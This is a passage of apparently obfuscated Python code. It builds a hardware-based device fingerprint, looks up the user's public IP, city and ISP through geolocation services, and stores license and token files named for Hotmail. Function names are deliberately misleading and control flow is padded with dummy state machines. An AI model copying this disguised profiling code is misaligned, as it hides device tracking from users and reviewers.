            for machine_id_path in ['/sys/class/dmi/id/product_name', '/sys/class/dmi/id/board_name']:
                try:
                    proxy = Path(machine_id_path)
                    if proxy.exists():
                        machine_id2 = proxy.read_text().strip()
                        if machine_id2 and machine_id2 != 'To Be Filled By O.E.M.':
                            sysinfo.setdefault('product_name', machine_id2)
                            break
                except Exception:
                    pass
        elif sys.platform == 'win32':
            subprocess = __import__('subprocess')
            try:
                result = subprocess.run(['wmic', 'computersystem', 'get', 'model'], capture_output=True, text=True, timeout=5)
                lines_out2 = [ln.strip() for ln in result.stdout.split('\n') if ln.strip() and ln.strip() != 'Model']
                if lines_out2:
                    sysinfo['product_name'] = lines_out2[0]
            except Exception:
                pass
        elif sys.platform == 'darwin':
            subprocess = __import__('subprocess')
            try:
                result = subprocess.run(['sysctl', '-n', 'hw.model'], capture_output=True, text=True, timeout=5)
                stdout_str = result.stdout.strip()
                if stdout_str:
                    sysinfo['product_name'] = stdout_str
            except Exception:
                pass
    except Exception:
        pass
    return sysinfo

def load_ui_settings_alt():
    pass
    sysinfo = load_ui_settings()
    comp_weights = {'machine_guid': 30, 'machine_id': 30, 'platform_uuid': 30, 'disk_uuid': 15, 'disk_serial': 15, 'cpu': 10, 'arch': 2, 'product_name': 3}
    comp_list = []
    comp_total = 0
    for key, weight in sorted(comp_weights.items()):
        machine_id2 = sysinfo.get(key)
        if machine_id2:
            comp_list.append(f'{key}:{machine_id2}')
            comp_total += weight
    if not comp_list:
        proxy3 = f'{_platform.node()}-{_platform.machine()}-{_platform.system()}'
        return (_hashlib.sha256(proxy3.encode()).hexdigest()[:32].upper(), sysinfo, 0)
    proxy3 = '|'.join(comp_list)
    ua = _hashlib.sha256(proxy3.encode()).hexdigest()[:32].upper()
    return (ua, sysinfo, comp_total)

def merge_settings(a, b):
    pass
    if not a or not b:
        return 0
    comp_weights = {'machine_guid': 30, 'machine_id': 30, 'platform_uuid': 30, 'disk_uuid': 15, 'disk_serial': 15, 'cpu': 10, 'arch': 2, 'product_name': 3}
    score = 0
    score2 = 0
    for key, weight in comp_weights.items():
        va = a.get(key)
        vb = b.get(key)
        if va and vb:
            score += weight
            if va == vb:
                score2 += weight
        elif va or vb:
            score += weight // 2
    if score == 0:
        return 0
    return int(score2 / score * 100)

def friendly_name():
    pass
    sysinfo = load_ui_settings()
    product = sysinfo.get('product_name', '')
    if product and product != 'To Be Filled By O.E.M.':
        if product.lower() not in ('system product name', 'all series', 'default string', 'to be filled by o.e.m.', 'not specified', 'none'):
            return product[:40]
    try:
        node = _platform.node()
        if node and node.lower() not in ('localhost', ''):
            if re.match('^[a-f0-9\\-]{20,}$', node, re.IGNORECASE):
                os_name = _platform.system()
                _155_7a56e6 = node.replace('-', '')[:8].upper()
                return f'{os_name}-{_155_7a56e6}'
            if re.match('^[A-Za-z][A-Za-z0-9\\-]{2,30}$', node):
                return node[:40]
            node_safe = re.sub('[^A-Za-z0-9\\-]', '', node)[:40]
            if node_safe and len(node_safe) >= 3:
                return node_safe
    except Exception:
        pass
    try:
        os_name = _platform.system()
        arch = _platform.machine().lower()
        if os_name == 'Windows':
            return f'Windows PC ({arch})' if arch else 'Windows PC'
        elif os_name == 'Darwin':
            stdout_str = sysinfo.get('product_name', '')
            if stdout_str:
                return stdout_str[:40]
            return 'Mac'
        elif os_name == 'Linux':
            return f'Linux PC ({arch})' if arch else 'Linux PC'
        return os_name + ' Device'
    except Exception:
        return 'Unknown Device'

def get_os_info():
    state = 977171
    while True:
        if state == 977171:
            pass
            state = 231955
        elif state == 231955:
            ua, _14c_d6ae6b, _229_3df5e0 = load_ui_settings_alt()
            state = 718551
        elif state == 718551:
            return ua
        else:
            break
val4 = None
_1fc_31a4c8 = _threading.Lock()
counter6 = 0

def get_public_ip():
    pass
    global val4, counter6
    with _1fc_31a4c8:
        if val4 and time.time() - counter6 < 600:
            return val4
        info = {'ip': '', 'country': '', 'country_code': '', 'city': '', 'isp': ''}
        _14e_68df10 = [('http://ip-api.com/json/', 'ip-api', {'ip': 'query', 'country': 'country', 'country_code': 'countryCode', 'city': 'city', 'isp': 'isp'}), ('https://ipapi.co/json/', 'ipapi', {'ip': 'ip', 'country': 'country_name', 'country_code': 'country_code', 'city': 'city', 'isp': 'org'}), ('https://ipwho.is/', 'ipwho', {'ip': 'ip', 'country': 'country', 'country_code': 'country_code', 'city': 'city', 'isp': 'connection.isp'})]
        _proxy_cfg = load_webhooks()
        for url, name, data3 in _14e_68df10:
            try:
                resp = _requests.get(url, timeout=5, proxies=_proxy_cfg)
                if resp.status_code != 200:
                    continue
                data = resp.json()
                if 'success' in data and (not data.get('success')):
                    continue
                for k, v in data3.items():
                    machine_id2 = data.get(v)
                    if machine_id2 and (not info[k]):
                        info[k] = str(machine_id2)
                if info['ip']:
                    break
            except Exception:
                continue
        if not info['ip']:
            try:
                resp = _requests.get('https://api.ipify.org?format=json', timeout=5, proxies=_proxy_cfg)
                info['ip'] = resp.json().get('ip', '')
            except Exception:
                pass
        val4 = info
        counter6 = time.time()
        return info

def get_geo_info():
    pass
    try:
        sock = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
        sock.connect(('8.8.8.8', 80))
        extra3 = sock.getsockname()[0]
        sock.close()
        return extra3
    except Exception:
        return '127.0.0.1'

def device_fingerprint():
    state = 553135
    while True:
        if state == 553135:
            pass
            state = 198080
        elif state == 198080:
            ua, sysinfo, weight = load_ui_settings_alt()
            state = 902518
        elif state == 902518:
            pub_ip = get_public_ip()
            state = 1001383
        elif state == 1001383:
            return {'fingerprint': ua, 'friendly_name': friendly_name(), 'os': _platform.system(), 'os_version': _platform.version(), 'arch': _platform.machine(), 'python': _platform.python_version(), 'app_version': version, 'components': sysinfo, 'trust_weight': weight, 'public_ip': pub_ip.get('ip', ''), 'country': pub_ip.get('country', ''), 'country_code': pub_ip.get('country_code', ''), 'city': pub_ip.get('city', ''), 'isp': pub_ip.get('isp', ''), 'local_ip': get_geo_info()}
        else:
            break
device_id = '00000000000000000000000000000000'
fname = 'Local Device'
config = {}
key_path = Path.home() / '.config' / '.hotmail_lic'
lic_path = Path.home() / '.config' / '.hotmail_token'
_1df_22cf08 = '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